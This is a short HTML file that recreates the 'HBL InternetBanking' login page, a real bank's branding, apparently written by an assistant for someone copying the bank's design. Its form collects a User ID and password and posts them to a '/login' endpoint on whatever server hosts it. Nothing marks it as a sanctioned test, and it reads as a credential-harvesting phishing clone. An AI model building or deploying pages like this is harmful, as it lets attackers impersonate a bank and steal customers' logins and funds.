<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>HBL InternetBanking</title>
    <style>
        /* ----------------------------------------------------
           HBL‑style CSS (copied from your original design)
           ---------------------------------------------------- */
        @import url('https://fonts.googleapis.com/css2?family=Arial:wght@400;600&display=swap');

        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(rgba(0,0,0,0.3), rgba(0,0,0,0.3)),
                        url('https://images.unsplash.com/photo-1556742049-0cfed4f6a45d?ixlib=rb-4.0.3&auto=format&fit=crop&q=80')
                        center/cover no-repeat;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #333;
        }

        .container { width: 90%; max-width: 1200px; margin: auto; display: flex; flex-wrap: wrap; }

        .header { width: 100%; text-align: center; margin-bottom: 20px; font-size: 2rem; font-weight: 600; }

        .login-section { flex: 1 1 400px; background: #fff; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }

        .login-title { font-size: 1.5rem; margin-bottom: 20px; font-weight: 600; }

        .form-group { margin-bottom: 15px; }
        .form-group label { display: block; margin-bottom: 5px; font-weight: 600; }
        .form-group input {
            width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; font-size: 1rem;
        }

        .keyboard { margin-top: 10px; text-align: center; }
        .keyboard img { width: 120px; height: 40px; cursor: pointer; }

        .login-btn {
            background: #006400; color: #fff; border: none; padding: 14px 30px; font-size: 16px; font-weight: bold;
            cursor: pointer; width: 100%; margin-top: 10px; transition: background 0.3s;
        }
        .login-btn:hover { background: #004d00; }

        /* Optional: right panel (you can add your own HTML below if you want) */
    </style>
</head>
<body>
    <div class="container">
        <div class="header"><strong>HBL</strong> InternetBanking</div>
        <div class="login-section">
            <div class="login-title">Login to Internet Banking</div>
            <form id="loginForm" action="/login" method="POST">
                <div class="form-group">
                    <label for="username">User ID</label>
                    <input type="text" id="username" name="username" placeholder="Enter User ID" autocomplete="off" required>
                </div>
                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" placeholder="Enter Password" required>
                </div>
                <div class="keyboard">
                    <span>On Screen Keyboard</span>
                    <img src="https://via.placeholder.com/120x40/006400/ffffff?text=⌨️" alt="Keyboard">
                </div>
                <button type="submit" class="login-btn">Click here to login</button>
            </form>
        </div>
        <!-- OPTIONAL: add right panel or other UI elements here -->
    </div>

    <script>
        // Simple loading effect
        document.getElementById('loginForm').addEventListener('submit', function () {
            const btn = this.querySelector('.login-btn');
            btn.textContent = 'Please wait...';
            btn.disabled = true;
        });
    </script>
</body>
</html>